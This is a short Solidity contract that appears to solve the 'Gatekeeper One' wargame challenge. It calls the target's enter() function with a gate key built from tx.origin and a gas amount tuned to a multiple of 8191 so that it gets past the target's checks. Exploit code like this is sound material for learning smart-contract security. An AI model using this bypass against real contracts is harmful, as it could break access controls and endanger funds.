// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public gko;

    constructor(address _instance) {
        gko = IGatekeeperOne(_instance);
    }

    function callEnter(address _modifiedTxOrigin, uint16 additionalGas) public returns (bool) {
        // modified tx origin is tx origin with tweaks to pass the require statements in `enter()`
        bytes8 _modifiedTxOriginBytes = bytes8(uint64(_modifiedTxOrigin));
        bool success;

        // send a message call with a specific amount of gas + a multiple of 8191
        (success,) = address(gko).call{
            gas: additionalGas + 10*8191
        }(abi.encodeWithSignature(
            'enter(bytes8)', 
            _modifiedTxOriginBytes
        ));

        // require success
        require(success, 'call failed');

        // return result of the success
        return success;
    }
    

}
